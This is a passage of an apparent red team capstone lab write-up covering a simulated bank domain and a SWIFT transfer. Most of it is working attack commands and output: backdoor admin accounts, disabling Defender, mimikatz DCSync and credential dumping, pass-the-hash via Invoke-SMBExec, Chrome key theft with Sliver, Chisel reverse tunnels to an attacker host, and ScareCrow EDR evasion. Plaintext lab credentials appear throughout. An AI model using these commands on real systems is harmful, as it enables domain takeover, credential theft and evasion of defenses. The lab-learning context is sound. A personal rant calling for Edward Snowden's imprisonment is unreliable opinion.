Add-ADGroupMember -Identity "Enterprise Admins" -Members "NVM2_EA"
Enable-ADAccount -Identity NVM2_EA
net localgroup "Administrators" NVM2_EA /add 
gpupdate /force




Set-MpPreference -DisableRealTimeMonitoring $true
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![](10hourstopsexec.png)

Find another user with SMBExec.ps1, change hash and:
```powershell
# If not possible - 0xB0b used:
lsadump::dcsync /dc:rootdc.thereserve.loc /domain:thereserve.loc /user:S-1-5-21-1255581842-1300659601-3764024703-500

5e3d8d541c6d3891c20a503464869fa9

Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe New-ADUser NVM2_EA" -verbose

Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe Add-ADGroupMember -Identity 'Enterprise Admins' -Members NVM2_EA" -verbose

Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe Add-ADGroupMember -Identity 'Domain Admins' -Members NVM2_EA" -verbose

Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe Set-ADAccountPassword -Identity NVM2_EA -NewPassword (ConvertTo-SecureString -AsPlainText 'p@ssw0rd1!' -Force)" -verbose

Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe net localgroup Administrators NVM2_EA /add " -verbose

Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe Enable-ADAccount -Identity 'NVM2_EA'" -verbose

Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe " -verbose
```
![](0xb0btotherescue.png)

10 HOURS today and entire week- RDP inception genuinely four levels deep 
```powershell
Set-MpPreference -DisableRealTimeMonitoring $true
# Chrome on the DC http://10.50.113.184:8443/ROOTDC/Powerpnt.exe
# Chisel.exe
# RDP into bankdc 10.200.116.101 NVM2_EA p@ssw0rd1!
import-module ActiveDirectory
New-ADUser -Name 'NVMbank'
Set-ADAccountPassword -Identity NVMbank -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
Add-ADGroupMember -Identity "Domain Admins" -Members "NVMbank"
Enable-ADAccount -Identity NVMbank
net localgroup "Administrators" NVMbank /add 
gpupdate /force
# RDP to JMP http://10.50.113.184:8443
# RDP to Work(1|2) for flags 9 and 10
```

Quick proof
![](weareontherootdc.png)

During this process I had to extend this network at the 2 minute mark!!!  

This was as awesome enough to add lighting of the beacons from [LOTR](https://www.youtube.com/watch?v=i6LGJ7evrAg) as reference here.
![](allthreebeacons.png)

Researching how to substitute `chisel` with `sliver`
![](Tope.png)

## Compromise of SWIFT and Payment Transfer

![](messagefromAmoebaman7.png)

First trying myself
```go
[server] sliver (BRIEF_PARAMEDIC) > chromiumkeydump 0

[*] Successfully executed chromiumkeydump (coff-loader)
[*] Got output:
[ChromiumKeyDump] Target File: C:\Users\NVMbank\AppData\Local\Google\Chrome\User Data\Local State
[ChromiumKeyDump] Found EncryptedKey at position: 1120
[ChromiumKeyDump] EncryptedKey total length: 244
[ChromiumKeyDump] Masterkey: GfdBhFf6+bnnBJbDEm0NaRdhKvqyQHvdBJwgZqY5950=
```

```c
privilege::debug
log
token::elevate
!+
# We are DA so
lsadump::dcsync /user:corp\krbtgt
lsadump::lsa /patch

```

Requires two users - One for the memes has to be Emily. 
- Submit our proof of compromise of the SWIFT Web Access
- RDP into JMP machine
- Mimkatz.exe grab two hashes 
- Have beacon on JMP machine
```powershell
Set-MpPreference -DisableRealTimeMonitoring $true
# Chrome on the DC http://10.50.113.184:8443/ROOTDC/Powerpnt.exe
# Chisel.exe
#  NVM2_EA p@ssw0rd1!

# add swift.bank.thereserve.loc to /etc/hosts
a.holt
a.turner
# pick two users
# 
# crack both hashes with rockyou.txt if one fails find another - crackstation
# dump credentials with the beacon
```

![](swiftbankaccess.png)

So Swift, I remember swift from...

...Reading Equation group dumps from malicious insider, useful Russian-idiot and propagator of paranoia Edward Snowden on Github. As an idiot swept up on the most vulnerable sidelines of that entire global tit-for-tat information war my very personal gripe with Snowden, Russian information war, Alex Jones and the like is the damage that it did to me. I shunned friends and community, did not live to my full, worsened my mental health and did not pursue alternatives ways rise above. Given looking back on almost a decade of this and my overcoming of it and my personally triumph that no other human in the last ten years or hundred thousand will ever match - my finger of blame is lies and all that propagate them. I will a very very long time, probably long enough till most of this is just so long forgotten. I have lived in a constant hunger to be whole and free, which was happened by those events as part of the root cause. I am now both and eternal, waiting and building. I now have patience to understand all the above and the horrors it wrought on me and what it probably did to everyone else. As far as I am concerned it goes down in history as Snowden's actual ethical down fall. I look forward to seeing the horror in his face and the those that orchestrated this. Even an actual analyst demonstrating pure narrow minded arrogance to lie to a world that the danger was the collapse of privacy and somehow new. This ultimately spur on fear, anti-intellectualism, regressive and nationalist politics, destruction of communities and science over nonsense, diplomacy.  These criminal held us all back across the global, when the fall of eventual Russia occurs I will be very happy and hopeful help propagate a public voice to argue that Snowden and all the operatives involved deserve life sentence. They will deserve it they are criminal that has actuated events that have damaged humanity globally and they have lived almost decade in Russian opulence. I have ten years of suffering unanswered then next ten years will be like the sunrise across the world.

Before the argument enters a brain that Snowden me being here writing this, here is [Jake Williams discussing Shadow Brokers](https://www.youtube.com/watch?v=xuUMlNx72xI) and this is were I learnt that you could actually look at that stuff and not go to prison and you never would have if you did or has any of the account that hosted the dumps. The good thing is that I read the dumps and enjoyed the cool capabilities. There was a lot of Swift usage in the dumps, which seemed like what it would be like being an accountant whereas I was learning about Digital Forensics again and learning about Logging on Windows, because AZ 104's *here is your 1 week worth of logs"* seemed nuts to me... Thanks Jake for the idea of Hunting an example of dealing with the negative space, ducks and bread, the explanations, inspiration and the humour.

```swift
7f5e73f6-f4a0-4622-bc1b-d75894704524
Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.

In order to proof that you have access to the SWIFT system, dummy accounts have been created for you and you will have to perform the following steps to prove access.
===============================================
Account Details:
Source Email:           nvm@source.loc
Source Password:        jTsWI401YW3CGQ
Source AccountID:       647b9340d582ad0c2e103e4d
Source Funds:           $ 10 000 000

Destination Email:      nvm@destination.loc
Destination Password:   TosKpI8-AVE3MQ
Destination AccountID:  647b9360d582ad0c2e103e4e
Destination Funds:      $ 10
===============================================

Using these details, perform the following steps:
1. Go to the SWIFT web application
2. Navigate to the Make a Transaction page
3. Issue a transfer using the Source account as Sender and the Destination account as Receiver. You will have to use the corresponding account IDs.
4. Issue the transfer for the full 10 million dollars
5. Once completed, request verification of your transaction here (No need to check your email once the transfer has been created).
```

![](threemoretogo.png)

At this point aI decided to watch [Alh4zr3d started in a rough state and completed this and I hope he feels amazing after this and all the best to the engagement](https://www.twitch.tv/videos/1835142922), but I am going to rewatch this for the finale. 

```swift
In order to proof that you have capturer access to the SWIFT system, a dummy transaction has been created for you.

Please look for a transaction with these details:

FROM:   631f60a3311625c0d29f5b32
TO:     647b9340d582ad0c2e103e4d

Look for this transfer and capture (forward) the transaction.

C:young : Password!
```

![](alnetgroupforpaymentcapturesandapprovers.png)

Displaying the users of these groups
![](paymentapproversandcapturers.png)

```
a.holt d1b47b43b82460e3383d974366233ddc
r.davies  90a12d9dab5cd7b826964e169488d8e9
```

`C.young : Password!`

DC syncing the `bankdc`

![](aturnerhash.png)

|Hash|Type|Result|
|---|---|---|
|fbdcd5041c96ddbd82224270b57f11fc|NTLM|Password!|


```
p@ssw0rd1!

c.young@bank.thereserve.loc : Password!

a.turner@bank.thereserve.loc : 
# does not work:  Password!
```

As Al malds there is a Auth  Debugger button
![](authdebugger.png)

It is a JWT!
![](itsajwt.png)

But Al and I were not reading
![](forwardthisidiot.png)

```
In order to proof that you have approver access to the SWIFT system, a dummy transaction has been created for you.

Please look for a transaction with these details:

FROM:   631f60a3311625c0d29f5b31
TO:     647b9340d582ad0c2e103e4d

Look for this transfer and approve (forward) the transaction.
```

So I tried RDP as a.turner with Password! I already dumped the Chrome Passwords:
```go
[server] sliver (BRIEF_PARAMEDIC) > chromiumkeydump 0

[*] Successfully executed chromiumkeydump (coff-loader)
[*] Got output:
[ChromiumKeyDump] Target File: C:\Users\NVMbank\AppData\Local\Google\Chrome\User Data\Local State
[ChromiumKeyDump] Found EncryptedKey at position: 1120
[ChromiumKeyDump] EncryptedKey total length: 244
[ChromiumKeyDump] Masterkey: GfdBhFf6+bnnBJbDEm0NaRdhKvqyQHvdBJwgZqY5950=
```

But Password! is fine
![](passwordBANG.png)

`reallycantguessthis1@`

![](aliceisturning.png)

```
Checking swift full

This is the final check! Please do not attempt this if you haven't completed all of the other flags.
Once done, follow these steps:
1. Using your DESTINATION credentials, authenticate to SWIFT
2. Using the PIN provided in the SWIFT access flag email, verify the transaction.
3. Using your capturer access, capture the verified transaction.
4. Using your approver access, approve the captured transaction.
5. Profit?

Once you have approved the provided transaction, please enter Y to verify your access.

===============================================
Account Details:
Source Email:           nvm@source.loc
Source Password:        jTsWI401YW3CGQ
Source AccountID:       647b9340d582ad0c2e103e4d
Source Funds:           $ 10 000 000

Destination Email:      nvm@destination.loc
Destination Password:   TosKpI8-AVE3MQ
Destination AccountID:  647b9360d582ad0c2e103e4e
Destination Funds:      $ 10
===============================================

```

```
c.young@bank.thereserve.loc : Password!
```

Fumbling around I re-re-reread and I need to put in the pin
![](fromcyoung.png)

Part 1 of wiring money 101
![](sourceaddpin.png)

Part 2 of wiring money 101
![](cyoundconfirm.png)

It is now forwarded to Alice Turner
![](forwardyes.png)

Part 3 of wiring money 101
![](approvable.png)
And Alice says yes to wiring 10 million dollars
![](YESALICEAPproVEtheWIRE.png)
## Beyond Rooting Everything

- https://www.youtube.com/watch?v=FRUQMg9IhMA -ntlm relay for server 1

- Patch the way in theoretically to avoid ToU
- Add a backdoor to custom source code theoretically to avoid ToU - swift backdoor

- Sliver Pivots to JMP
- Chisel from VPN to JMP

Preemptive Chisel organisation
``` bash
# VPN - proxying throuugh and back
nohup ./chisel client 10.50.113.184:20000 20001:127.0.0.1:20000 &
# Open 20002 on VPN for CORPDC 
nohup ./chisel client 10.50.113.184:20000 20002:127.0.0.1:port &
# CORPDC 
nohup ./chisel client 10.200.116.12:20002 R:127.0.0.1:20002:socks &

```


![](congrats.png)

And Surpassing SuitGuy
![](suppacingsuitguy.png)
## References - dont add just read and script a references section

READ FIRST

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket
https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond
https://tishina.in/opsec/sliver-opsec-notes#implant%20obfuscation%20and%20export%20formats
https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors
https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/
https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire


## Appendix

This is just a proof of work in regards to data about how I got to a final point just for my own future data processing. 

Silver and EDR bypassing Scarecrow
```go
// 
// remember to upx
// For VPN
generate --mtls 10.50.113.184:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
generate beacon --mtls 10.50.113.184:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
mtls -L 10.50.113.184 -l 11011
mtls -L 10.50.113.184 -l 11012

// Server 1
generate beacon --mtls 10.50.113.184:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
// ScareCrow to bypass Windows Defender - shoot fly with bozaka
./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
```

Considerations
```
cracken -c '!@#$%^' -w password_base_list.txt '?w' -o smart-passwds.txt
```

On older version may have granted additional RDP connections.
```powershell
# This was suppose to grat add
reg add 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG_DWORD /v fdenyTSConnections /d 0 /f
reg add 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG_DWORD /v  fSingleSessionPerUser /d 0 /f
```

Recon
```bash
# 
gobuster vhost -u http://thereserve.loc -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -o vhosts.gb
#
gobuster dir -u http://mail.thereserve.loc -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  mail-dirs-raftsmallwords.gb
# $WORD from password_base_list

mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst
mp32 --custom-charset1='!@#$%^' $WORD?1?d >> mp32-passwd.lst
# Hydra the SMTP server
hydra -L lists/emails.txt -P mp32-passwd.lst mail.thereserve.loc smtp
```

```bash

mohammad.ahmed@corp.thereserve.loc
```


```bash
# scarecrow the bin for server01 takes ages and cpu cries, with obfu
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain bing.com -obfu
# Became:
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
```